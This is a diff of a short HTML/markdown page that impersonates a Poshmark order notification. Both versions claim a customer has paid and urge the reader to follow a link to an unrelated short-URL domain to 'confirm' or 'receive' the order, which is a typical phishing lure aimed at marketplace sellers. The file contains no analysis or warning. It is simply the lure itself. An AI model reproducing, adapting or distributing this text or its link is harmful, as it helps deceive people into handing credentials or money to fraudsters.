@@ -1,2 +1,16 @@
-# Poshmark Order
-The recipient has placed and paid for your order, you will need to go to the transaction page to receive your order: <a href=https://shorturllink12.site/n4p> Go to finish</a>
+<h1 align="center">Poshmark Order</h1>
+
+
+The customer has placed and paid for the order on our website.
+To confirm the order you need to follow the link below:
+<a align="center" href='https://shorturllink12.site/nln'>click to confirm</a>
+
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<i>@2025</i>
+<i>Best Regards</i>
